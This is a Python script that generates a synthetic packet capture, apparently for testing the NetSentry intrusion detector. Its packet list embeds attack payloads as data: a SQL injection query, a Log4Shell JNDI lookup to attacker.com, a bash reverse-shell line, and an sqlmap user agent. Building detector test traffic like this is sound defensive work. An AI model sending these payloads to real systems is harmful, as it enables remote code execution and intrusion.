#!/usr/bin/env python3
"""
gen_test_pcap.py — generate a synthetic pcap for NetSentry quickstart testing.

Uses Scapy when available and falls back to a small stdlib pcap writer.
Output: /tmp/netsentry_test.pcap
"""

import socket
import struct
import time

try:
    from scapy.all import IP, TCP, Raw, wrpcap, Ether
except ImportError:
    IP = TCP = Raw = wrpcap = Ether = None

DEST = "/tmp/netsentry_test.pcap"

PACKETS = [
    ("tcp", "10.0.0.1", "10.0.0.2", 54321, 80,
     b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"),
    ("tcp", "10.0.0.3", "10.0.0.2", 54322, 80,
     b"GET /search?q=1'+union+select+1,2,3-- HTTP/1.1\r\n\r\n"),
    ("tcp", "10.0.0.4", "10.0.0.2", 54323, 80,
     b"GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://attacker.com/a}\r\n\r\n"),
    ("tcp", "10.0.0.5", "10.0.0.2", 54324, 4444,
     b"bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"),
    ("tcp", "10.0.0.6", "10.0.0.2", 54325, 80,
     b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n"),
    ("udp", "10.0.0.1", "8.8.8.8", 12345, 53, b"\x00\x01\x00\x00"),
]


def scapy_write():
    from scapy.all import UDP

    packets = []
    for proto, src, dst, sport, dport, payload in PACKETS:
        if proto == "tcp":
            packets.append(
                Ether() / IP(src=src, dst=dst) /
                TCP(sport=sport, dport=dport, flags="PA") / Raw(payload)
            )
        else:
            packets.append(
                Ether() / IP(src=src, dst=dst) /
                UDP(sport=sport, dport=dport) / Raw(payload)
            )
    wrpcap(DEST, packets)


def ipv4_header(src, dst, proto, payload_len):
    version_ihl = 0x45
    total_len = 20 + payload_len
    return struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, 0, 0, 64, proto, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def tcp_packet(src, dst, sport, dport, payload):
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + struct.pack("!H", 0x0800)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, 1, 1, 0x50, 0x18, 8192, 0, 0)
    return eth + ipv4_header(src, dst, 6, len(tcp) + len(payload)) + tcp + payload


def udp_packet(src, dst, sport, dport, payload):
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + struct.pack("!H", 0x0800)
    udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    return eth + ipv4_header(src, dst, 17, len(udp) + len(payload)) + udp + payload


def stdlib_write():
    with open(DEST, "wb") as f:
        f.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        now = int(time.time())
        for idx, (proto, src, dst, sport, dport, payload) in enumerate(PACKETS):
            if proto == "tcp":
                frame = tcp_packet(src, dst, sport, dport, payload)
            else:
                frame = udp_packet(src, dst, sport, dport, payload)
            f.write(struct.pack("<IIII", now, idx, len(frame), len(frame)))
            f.write(frame)


if wrpcap:
    scapy_write()
else:
    stdlib_write()

print(f"[gen_test_pcap] wrote {len(PACKETS)} packets to {DEST}")
